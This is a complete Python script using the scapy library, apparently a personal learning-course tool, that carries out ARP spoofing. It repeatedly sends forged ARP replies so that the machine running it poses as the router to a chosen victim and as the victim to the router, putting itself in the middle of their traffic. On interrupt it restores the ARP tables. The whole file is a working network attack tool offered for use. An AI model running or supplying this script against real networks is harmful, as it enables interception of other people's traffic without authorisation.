#!/bin/python3
#ARP spoofer by Jose Oregon
#Don't forget to upate FW rules and forwarding

import scapy.all as scapy
import time
import optparse

def get_target():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Enter a the target IP")
    parser.add_option("-s", "--spoof", dest="spoof_ip", help="Enter the target to spoof")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("Please enter a target IP, use --help for options")
    elif not options.spoof_ip:
        parser.error("Please enter the IP to spoof, use --help for options")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request 
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet, count=4 ,verbose=False)

options = get_target()

packet_counter=0

try:
    while True:
        #send response to victim that attacker is router
        spoof(options.target_ip,options.spoof_ip)
        #send response to router that you are victim
        spoof(options.spoof_ip,options.target_ip)
        time.sleep(2)
        packet_counter += 2
        print('\rPackets sent:' + str(packet_counter), end="")
except KeyboardInterrupt:
    print('\nDetected Ctrl + c, Resetting ARP tables')
    restore(options.target_ip,options.spoof_ip)
    restore(options.spoof_ip,options.target_ip)
